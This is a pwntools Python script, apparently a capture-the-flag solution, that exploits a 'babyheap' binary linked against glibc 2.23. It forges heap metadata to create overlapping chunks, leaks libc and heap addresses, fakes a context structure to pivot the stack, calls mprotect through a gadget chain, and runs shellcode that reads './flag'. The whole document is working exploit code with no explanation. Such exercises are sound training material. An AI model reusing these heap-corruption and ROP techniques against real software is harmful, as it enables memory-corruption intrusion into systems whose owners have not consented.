#!/usr/bin/env python
from pwn import *
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def menu(i):
    ru(': \n')
    sl(str(i))


def add(size):
    menu(1)
    ru(': ')
    sl(str(size))

def edit(index,content):
    menu(2)
    ru(': ')
    sl(str(index))
    ru(': ')
    sd(content)

def delete(index):
    menu(3)
    ru(': ')
    sl(str(index))
def show(index):
    menu(4)
    ru(': ')
    sl(str(index))

def debugf(payload=''):
    gdb.attach(p,payload)

context.arch='amd64'
context.log_level='debug'
p=process('./babyheap',env={'LD_PRELOAD':'./libc-2.23.so'})

add(0x400)        # 
add(0x408)        # 1
add(0xf0)         # 
add(0xf0)         # 

delete(0)
edit(1,'a'*0x400+p64(0x400+0x400+0x20))
delete(2)

add(0x400)        # 0
show(1)
libc_addr=u64(p.recvline()[0:6].ljust(8,'\x00'))
libc_base=libc_addr-0x3c4b78
print(hex(libc_addr))

add(0xf0)         # 
add(0x400)        # 4

add(0xf0)         # 
add(0x418)        # 6
add(0xf0)         # 
add(0xf0)         # 8
delete(3)
delete(2)
show(1)
heap_addr=u64(p.recvline()[0:6].ljust(8,'\x00'))
add(0xf0)        # 2
add(0xf0)        # 3

delete(5)
edit(6,'a'*0x410+p64(0x100+0x420))
delete(7)

add(0xf0)        # 5
add(0x410)       # 7       double with 6
add(0xf0)        # 9

delete(6)
add(0x1000)      # 6

delete(4)
delete(8)

fake={
    0x0:p64(libc_base+0x3c4f68),
    0x8:p64(libc_base+0x3c4f68),
    0x10:p64(libc_addr+0x200),
    0x18:p64(libc_base+0x3c92e0-0x20)
}
edit(7,fit(fake,filler='\x00'))
add(0xf0)                # 4
# print(hex(heap_addr))
one=0x47b75+libc_base
ret=0x47bbf+libc_base
debugf('b *{}'.format(hex(one)+'\nb *{}'.format(hex(ret))))
fake={
    0x0:p64(ret),
    0x8:p64(one),
    0xa0:p64(heap_addr-0x510+0x100+0xb0),       # rsp
    0x68:p64(heap_addr-0x920),        # rdi start_adr
    0x70:p64(0x21000),           # rsi len
    0x88:p64(7),                # rdx prot
    0xa8:p64(0x33544+libc_base)   # rcx ret_ip: pop rax_ret
}
rax=10
syscall_ret=libc_base+0xcd245
ret_addr=heap_addr-0x348
gadget=p64(rax)+p64(syscall_ret)+p64(ret_addr)
context.arch='amd64'
shellcode=asm(shellcraft.open('./flag'))
# shellcode+=asm(shellcraft.read(3,'rsp+0x30',100))
shellcode+=asm(
    """
    sub rsp,0x40;
    """
)
shellcode+=asm(shellcraft.read(4,'rsp',0x20))+asm(shellcraft.write(1,'rsp',0x20))
shellcode+=asm(shellcraft.exit(0))
edit(1,'\xff'*0xf0+fit(fake,filler='\x00')+gadget+shellcode)

delete(7)

print(hex(heap_addr))
p.interactive()